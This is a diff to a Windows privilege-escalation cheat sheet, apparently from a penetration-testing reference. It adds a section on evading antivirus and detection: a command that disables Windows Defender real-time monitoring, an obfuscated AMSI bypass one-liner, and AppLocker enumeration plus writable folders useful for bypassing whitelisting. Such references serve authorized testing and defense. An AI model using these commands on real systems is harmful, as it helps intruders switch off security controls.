@@ -6,7 +6,11 @@
 * [Windows Version and Configuration](#windows-version-and-configuration)
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
-* [AppLocker Enumeration](#applocker-enumeration)
+* [Antivirus & Detections](#antivirus--detections)
+    * [Windows Defender](#windows-defender)
+    * [AppLocker Enumeration](#applocker-enumeration)
+    * [Powershell](#powershell)
+    * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
     * [Search for file contents](#search-for-file-contents)
@@ -223,10 +227,54 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
-## AppLocker Enumeration
+## Antivirus & Detections
+
+### Windows Defender
+
+```powershell
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable Real Time Monitoring
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+```
+
+### AppLocker Enumeration
 
 - With the GPO
 - HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+
+List AppLocker rules
+
+```powershell
+PS C:\> $a = Get-ApplockerPolicy -effective
+PS C:\> $a.rulecollections
+```
+
+### Powershell
+
+Default powershell locations in a Windows system.
+
+```powershell
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+
+Example of AMSI Bypass.
+
+```powershell
+PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+```
+
+
+### Default Writeable Folders
+
+```powershell
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
+```
 
 ## EoP - Looting for passwords
 
